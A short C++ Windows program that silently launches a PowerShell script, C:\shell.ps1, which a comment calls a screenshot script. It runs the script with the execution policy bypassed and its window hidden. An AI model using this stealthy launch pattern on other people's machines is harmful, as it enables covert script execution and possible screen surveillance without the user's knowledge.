/*
	This program launches the script
*/

#include <iostream>
#include <windows.h>

#define PARAM_LEN   512

using namespace std;

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
{
	char path[MAX_PATH] = "C:";
	char param[PARAM_LEN] = "-executionpolicy bypass -Command \"& '";

	// concatenate path and param
	strcat_s(param, path);
	strcat_s(param, "\\shell.ps1'\"");

	// launch screenshot script
	ShellExecute(NULL, "open", "powershell.exe", param, NULL, SW_HIDE);

	return 0;
}
